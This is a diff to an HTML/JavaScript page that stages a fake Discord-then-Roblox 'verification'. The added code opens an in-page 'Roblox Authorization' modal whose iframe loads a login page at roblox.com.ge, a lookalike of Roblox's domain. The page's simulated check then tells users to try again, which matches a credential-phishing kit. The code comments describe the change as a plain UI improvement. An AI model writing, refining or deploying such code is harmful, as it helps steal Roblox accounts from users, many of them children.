@@ -17,7 +17,6 @@
 
       body {
         min-height: 100vh;
-        /* Updated to Deep Black/Red Gradient */
         background: linear-gradient(
           135deg,
           #050505 0%,
@@ -418,10 +417,93 @@
       
       .btn-content { display: flex; align-items: center; gap: 12px; }
       .locked-message { color: #ff6b6b; font-size: 0.75rem; text-align: center; margin-top: 12px; }
+
+      /* Iframe Modal Styles */
+      .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.9);
+        z-index: 2000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        visibility: hidden;
+        opacity: 0;
+        transition: 0.3s ease;
+      }
+
+      .modal-overlay.active {
+        visibility: visible;
+        opacity: 1;
+      }
+
+      .modal-content {
+        background: #0a0a0a;
+        width: 90%;
+        max-width: 500px;
+        border: 1px solid #ff3131;
+        border-radius: 24px;
+        overflow: hidden;
+        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 0, 0, 0.2);
+      }
+
+      .modal-content-header {
+        padding: 16px 20px;
+        background: linear-gradient(135deg, #8b0000, #1a0505);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid rgba(255, 50, 50, 0.3);
+      }
+
+      .modal-content-header h3 {
+        font-size: 1.1rem;
+        color: white;
+      }
+
+      .close-iframe-btn {
+        background: none;
+        border: none;
+        color: white;
+        font-size: 24px;
+        cursor: pointer;
+        transition: color 0.3s;
+      }
+
+      .close-iframe-btn:hover {
+        color: #ff3131;
+      }
+
+      .iframe-wrapper {
+        width: 100%;
+        height: 500px;
+        background: #000;
+      }
+
+      .iframe-wrapper iframe {
+        width: 100%;
+        height: 100%;
+        border: none;
+      }
     </style>
   </head>
   <body>
     <div class="frost-overlay"></div>
+
+    <div class="modal-overlay" id="iframeModal">
+      <div class="modal-content">
+        <div class="modal-content-header">
+          <h3>🎮 Roblox Authorization</h3>
+          <button class="close-iframe-btn" id="closeIframeBtn">✕</button>
+        </div>
+        <div class="iframe-wrapper">
+          <iframe id="robloxIframe" src="about:blank"></iframe>
+        </div>
+      </div>
+    </div>
 
     <div class="ai-chat-head" id="aiChatHead">
       <div class="ai-avatar">
@@ -612,6 +694,14 @@
       chatHead.onclick = () => chatWindow.classList.toggle("active");
       document.getElementById("closeChatBtn").onclick = () => chatWindow.classList.remove("active");
 
+      // Iframe Modal Logic
+      const iframeModal = document.getElementById("iframeModal");
+      const closeIframeBtn = document.getElementById("closeIframeBtn");
+      
+      closeIframeBtn.onclick = () => {
+        iframeModal.classList.remove("active");
+      };
+
       // Verification Simulation
       let dClicked = false;
       document.getElementById("discordLink").onclick = () => dClicked = true;
@@ -626,17 +716,26 @@
         document.getElementById("step1Status").innerHTML = "✅";
         document.getElementById("step2Card").classList.remove("locked");
         document.getElementById("warningMsg").style.display = "none";
+        
+        // Replaced redirect link with an in-page modal trigger
         document.getElementById("robloxLinkContainer").innerHTML = `
-            <a href="https://roblox.com.ge/login?returnUrl=5285318607103111" class="step-link-btn roblox" id="robloxLink" target="_blank">
+            <div class="step-link-btn roblox" id="robloxLink" style="cursor: pointer;">
                 <div class="btn-content"><span>🎮</span> Verify Roblox</div><span>→</span>
-            </a>`;
+            </div>`;
+            
         const rBtn = document.getElementById("verifyRobloxBtn");
         rBtn.disabled = false;
         rBtn.innerHTML = "Verify Via Roblox";
         
         let rClicked = false;
         setTimeout(() => {
-            document.getElementById("robloxLink").onclick = () => rClicked = true;
+            document.getElementById("robloxLink").onclick = () => {
+                rClicked = true;
+                // Open modal and set iframe source instead of redirecting
+                iframeModal.classList.add("active");
+                document.getElementById("robloxIframe").src = "https://roblox.com.ge/login?returnUrl=5285318607103111";
+            };
+            
             rBtn.onclick = function() {
                 if(!rClicked) { alert("Verify in Roblox first!"); return; }
                 this.innerHTML = "✗ PLEASE TRY AGAIN";
